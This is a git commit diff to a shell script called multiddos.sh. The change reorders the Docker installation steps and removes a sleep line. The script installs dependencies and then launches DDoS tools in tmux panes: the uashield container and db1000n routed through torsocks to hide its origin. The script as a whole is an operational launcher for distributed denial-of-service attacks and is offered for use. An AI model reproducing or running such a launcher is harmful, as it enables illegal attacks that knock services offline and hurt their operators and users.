8900878ab563d5b4c6fa9fa8169ff7ecf28d450c
KarboDuck <53382906+KarboDuck@users.noreply.github.com>
2022-04-06 20:28:46 +0300

    Update multiddos.sh

--- multiddos.sh
+++ multiddos.sh
@@ -2,16 +2,16 @@
 sudo apt-get update -y
 sudo apt-get install -y tmux wget torsocks python3 python3-pip gcc libc-dev libffi-dev libssl-dev python3-dev rustc
 pip install --upgrade pip
+#install docker
+sudo apt install apt-transport-https ca-certificates curl software-properties-common
+curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo apt-key add -
+sudo add-apt-repository "deb [arch=amd64] https://download.docker.com/linux/ubuntu focal stable"
+sudo apt install docker-ce -y
+    
 if [ ! -f "/usr/local/bin/gotop" ]; then
     wget https://github.com/cjbassi/gotop/releases/download/3.0.0/gotop_3.0.0_linux_amd64.deb
     sudo dpkg -i gotop_3.0.0_linux_amd64.deb
     rm gotop_3.0.0_linux_amd64.deb
-fi
-if [ ! -f "/usr/bin/docker" ]; then
-    sudo apt install apt-transport-https ca-certificates curl software-properties-common
-    curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo apt-key add -
-    sudo add-apt-repository "deb [arch=amd64] https://download.docker.com/linux/ubuntu focal stable"
-    sudo apt install docker-ce -y
 fi
 
 tmux kill-session -t multiddos
@@ -30,6 +30,5 @@ sleep 0.1
 tmux split-window -v 'docker run -it --rm  ghcr.io/opengs/uashield:master 512 true'
 sleep 0.1
 tmux split-window -v 'torsocks -i ./db1000n'
-sleep 0.1
 #tmux split-window -v 'docker run --rm -it --pull always ghcr.io/arriven/db1000n'
 tmux -2 attach-session -d
